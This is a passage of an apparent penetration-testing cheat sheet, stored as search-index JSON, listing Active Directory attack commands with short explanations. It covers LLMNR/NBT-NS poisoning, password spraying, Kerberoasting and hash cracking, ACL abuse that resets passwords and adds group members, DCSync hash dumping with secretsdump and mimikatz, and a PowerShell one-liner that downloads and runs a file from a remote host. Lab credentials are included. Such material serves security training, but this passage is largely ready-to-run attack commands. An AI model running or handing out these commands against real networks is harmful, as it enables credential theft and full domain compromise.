authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.   gettgtpkinit.py Tool for manipulating certificates and TGTs.   getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U.   adidnsdump A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer.   gpp-decrypt Extracts usernames and passwords from Group Policy preferences.   GetNPUsers.py Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set.   lookupsid.py SID bruteforcing tool.   ticketer.py A tool for creation and customization of TGT/TGS tickets.   raiseChild.py Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation.   Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.   PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).   Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).   ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.","title":"Tools of the Trade"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#initial-enumeration","text":"Command Description     <code>nslookup ns1.LEGALCORP.com</code> Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.   <code>sudo tcpdump -i ens224</code> Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.   <code>sudo responder -I ens224 -A</code> Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code>-I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host   <code>fping -asgq 172.16.5.0/23</code> Performs a ping sweep on the specified network segment from a Linux-based host.   <code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code> Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host   <code>sudo git clone https://github.com/ropnop/kerbrute.git</code> Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.   <code>make help</code> Used to list compiling options that are possible with <code>make</code> from a Linux-based host.   <code>sudo make all</code> Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.   <code>./kerbrute_linux_amd64</code> Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.   <code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code> Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.   <code>./kerbrute_linux_amd64 userenum -d legalcorp.local --dc 172.16.5.5 jsmith.txt -o kerb-results</code> Runs the Kerbrute tool to discover usernames in the domain (<code>legalcorp.local</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.","title":"Initial Enumeration"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#llmnrntb-ns-poisoning","text":"Command Description     <code>responder -h</code> Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.   <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code> Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.   <code>Import-Module .\\Inveigh.ps1</code> Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.   <code>(Get-Command Invoke-Inveigh).Parameters</code> Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.   <code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code> Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.   <code>.\\Inveigh.exe</code> Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.   <code>$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey \\|foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}</code> PowerShell script used to disable NBT-NS on a Windows host.","title":"LLMNR/NTB-NS Poisoning"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#password-spraying-password-policies","text":"Command Description     <code>#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done</code> Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.   <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code> Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.   <code>rpcclient -U \"\" -N 172.16.5.5</code> Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.   <code>rpcclient $&gt; querydominfo</code> Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.   <code>enum4linux  -P 172.16.5.5</code> Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.   <code>enum4linux-ng -P 172.16.5.5 -oA lcorp</code> Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.   <code>ldapsearch -h 172.16.5.5 -x -b \"DC=LEGALCORP,DC=LOCAL\" -s sub \"*\" \\| grep -m 1 -B 10 pwdHistoryLength</code> Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.   <code>net accounts</code> Used to enumerate the password policy in a Windows domain from a Windows-based host.   <code>Import-Module .\\PowerView.ps1</code> Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.   <code>Get-DomainPolicy</code> Used to enumerate the password policy in a target Windows domain from a Windows-based host.   <code>enum4linux -U 172.16.5.5  \\| grep \"user:\" \\| cut -f2 -d\"[\" \\| cut -f1 -d\"]\"</code> Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.   <code>rpcclient -U \"\" -N 172.16.5.5  rpcclient $&gt; enumdomuser</code> Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.   <code>crackmapexec smb 172.16.5.5 --users</code> Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.   <code>ldapsearch -h 172.16.5.5 -x -b \"DC=LEGALCORP,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  \\| grep sAMAccountName: \\| cut -f2 -d\" \"</code> Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.   <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code> Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.   <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 \\| grep Authority; done</code> Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.   <code>kerbrute passwordspray -d legalcorp.local --dc 172.16.5.5 valid_users.txt  Welcome1</code> Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \\| grep +</code> Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.   <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code> Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.   <code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \\| grep +</code> Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.   <code>Import-Module .\\DomainPasswordSpray.ps1</code> Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.   <code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code> Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.","title":"Password Spraying &amp; Password Policies"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#enumerating-security-controls","text":"Command Description     <code>Get-MpComputerStatus</code> PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.   <code>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections</code> PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.   <code>$ExecutionContext.SessionState.LanguageMode</code> PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.   <code>Find-LAPSDelegatedGroups</code> A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.   <code>Find-AdmPwdExtendedRights</code> A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.   <code>Get-LAPSComputers</code> A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.","title":"Enumerating Security Controls"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#credentialed-enumeration","text":"Command Description     <code>xfreerdp /u:forend@legalcorp.local /p:Klmcargo2 /v:172.16.5.25</code> Connects to a Windows target using valid credentials. Performed from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.   <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.   <code>smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5</code> Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.   <code>smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5 -R SYSVOL --dir-only</code> Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.   <code>rpcclient $&gt; queryuser 0x457</code> Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.   <code>rpcclient $&gt; enumdomusers</code> Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.   <code>psexec.py legalcorp.local/wley:'transporter@4'@172.16.5.125</code> Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.   <code>wmiexec.py legalcorp.local/wley:'transporter@4'@172.16.5.5</code> Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.   <code>windapsearch.py -h</code> Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.   <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u LEGALCORP\\wley -p Klmcargo2 --da</code> Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.   <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u LEGALCORP\\wley -p Klmcargo2 -PU</code> Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.   <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d legalcorp.local -c all</code> Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>legalcorp.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.","title":"Credentialed Enumeration"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#enumeration-by-living-off-the-land","text":"Command Description     <code>Get-Module</code> PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.   <code>Import-Module ActiveDirectory</code> Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.   <code>Get-ADDomain</code> PowerShell cmd-let used to gather Windows domain information from a Windows-based host.   <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code> PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.   <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.   <code>Get-ADGroup -Filter * \\| select name</code> PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.   <code>Get-ADGroup -Identity \"Backup Operators\"</code> PowerShell cmd-let used to search for a specifc group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host.   <code>Get-ADGroupMember -Identity \"Backup Operators\"</code> PowerShell cmd-let used to discover the members of a specific group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host.   <code>Export-PowerViewCSV</code> PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.   <code>ConvertTo-SID</code> PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host.   <code>Get-DomainSPNTicket</code> PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.   <code>Get-Domain</code> PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.   <code>Get-DomainController</code> PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.   <code>Get-DomainUser</code> PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.   <code>Get-DomainComputer</code> PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.   <code>Get-DomainGroup</code> PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.   <code>Get-DomainOU</code> PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.   <code>Find-InterestingDomainAcl</code> PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.   <code>Get-DomainGroupMember</code> PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.   <code>Get-DomainFileServer</code> PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.   <code>Get-DomainDFSShare</code> PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.   <code>Get-DomainGPO</code> PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.   <code>Get-DomainPolicy</code> PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.   <code>Get-NetLocalGroup</code> PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.   <code>Get-NetLocalGroupMember</code> PowerView script enumerate members of a specific local group. Performed from a Windows-based host.   <code>Get-NetShare</code> PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.   <code>Get-NetSession</code> PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.   <code>Test-AdminAccess</code> PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.   <code>Find-DomainUserLocation</code> PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.   <code>Find-DomainShare</code> PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.   <code>Find-InterestingDomainShareFile</code> PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.   <code>Find-LocalAdminAccess</code> PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.   <code>Get-DomainTrust</code> PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.   <code>Get-ForestTrust</code> PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.   <code>Get-DomainForeignUser</code> PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.   <code>Get-DomainForeignGroupMember</code> PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.   <code>Get-DomainTrustMapping</code> PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.   <code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse</code> PowerView script used to list all the members of a target group (<code>\"Domain Admins\"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.   <code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code> PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.   <code>.\\Snaffler.exe  -d legalcorp.local -s -v data</code> Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.","title":"Enumeration by Living Off the Land"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#transfering-files","text":"Command Description     <code>sudo python3 -m http.server 8001</code> Starts a python web server for quick hosting of files. Performed from a Linux-basd host.   <code>\"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')\"</code> PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.   <code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code> Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.","title":"Transfering Files"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#kerberoasting","text":"Command Description     <code>sudo python3 -m pip install .</code> Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.   <code>GetUserSPNs.py -h</code> Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.   <code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday</code> Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.   <code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request</code> Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.   <code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request-user sqldev</code> Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.   <code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request-user sqldev -outputfile sqldev_tgs</code> Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.   <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code> Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.   <code>setspn.exe -Q */*</code> Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.   <code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433\"</code> PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.   <code>setspn.exe -T legalcorp.local -Q */* \\| Select-String '^CN' -Context 0,1 \\| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code> Used to download/request all TGS tickets from a WIndows-based host.   <code>mimikatz # base64 /out:true</code> <code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.   <code>kerberos::list /export</code> <code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.   <code>echo \"&lt;base64 blob&gt;\" \\|  tr -d \\\\n</code> Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.   <code>cat encoded_file \\| base64 -d &gt; sqldev.kirbi</code> Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.   <code>python2.7 kirbi2john.py sqldev.kirbi</code> Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.   <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code> Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.   <code>cat sqldev_tgs_hashcat</code> Used to view the prepared hash from a Linux-based host.   <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code> Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.   <code>Import-Module .\\PowerView.ps1  Get-DomainUser * -spn \\| select samaccountname</code> Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.   <code>Get-DomainUser -Identity sqldev \\| Get-DomainSPNTicket -Format Hashcat</code> PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.   <code>Get-DomainUser * -SPN \\| Get-DomainSPNTicket -Format Hashcat \\| Export-Csv .\\lcorp_tgs.csv -NoTypeInformation</code> Exports all TGS tickets to a <code>.CSV</code> file (<code>lcorp_tgs.csv</code>) from a Windows-based host.   <code>cat .\\lcorp_tgs.csv</code> Used to view the contents of the .csv file from a Windows-based host.   <code>.\\Rubeus.exe</code> Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.   <code>.\\Rubeus.exe kerberoast /stats</code> Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.   <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code> Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.   <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code> Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.   <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code> PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.   <code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code> Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .","title":"Kerberoasting"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#acl-enumeration-tactics","text":"Command Description     <code>Find-InterestingDomainAcl</code> PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.   <code>Import-Module .\\PowerView.ps1  $sid = Convert-NameToSid wley</code> Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.   <code>Get-DomainObjectACL -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.   <code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"   Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \\| Select Name,DisplayName,DistinguishedName,rightsGuid \\| ?{$_.rightsGuid -eq $guid} \\| fl</code> Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.   <code>Get-DomainObjectACL -ResolveGUIDs -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host.   <code>Get-ADUser -Filter * \\| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code> Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.   <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\user\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" \\| Select-Object Path -ExpandProperty Access \\| Where-Object {$_.IdentityReference -match 'LEGALCORP\\\\wley'}}</code> A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.   <code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('LEGALCORP\\wley', $SecPassword)</code> Used to create a <code>PSCredential Object</code> from a Windows-based host.   <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code> Used to create a <code>SecureString Object</code> from a Windows-based host.   <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code> PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.   <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * \\| Select -ExpandProperty Members</code> PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.   <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.   <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" \\| Select MemberName</code> PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.   <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code> PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.   <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code> PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.   <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.   <code>ConvertFrom-SddlString</code> PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.","title":"ACL Enumeration &amp; Tactics"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#dcsync","text":"Command Description     <code>Get-DomainUser -Identity adunn  \\| select samaccountname,objectsid,memberof,useraccountcontrol \\|fl</code> PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.   <code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" Get-ObjectAcl \"DC=LEGALCORP,DC=local\" -ResolveGUIDs \\| ? { ($_.ObjectAceType -match 'Replication-Get')} \\| ?{$_.SecurityIdentifier -match $sid} \\| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \\| fl</code> Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host.   <code>secretsdump.py -outputfile LEGALCORP_hashes -just-dc LEGALCORP/adunn@172.16.5.5 -use-vss</code> Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>LEGALCORP_hashes</code>). Performed from a Linux-based host.   <code>mimikatz # lsadump::dcsync /domain:legalcorp.local /user:LEGALCORP\\administrator</code> Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.","title":"DCSync"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#privileged-access","text":"Command Description     <code>Get-NetLocalGroupMember 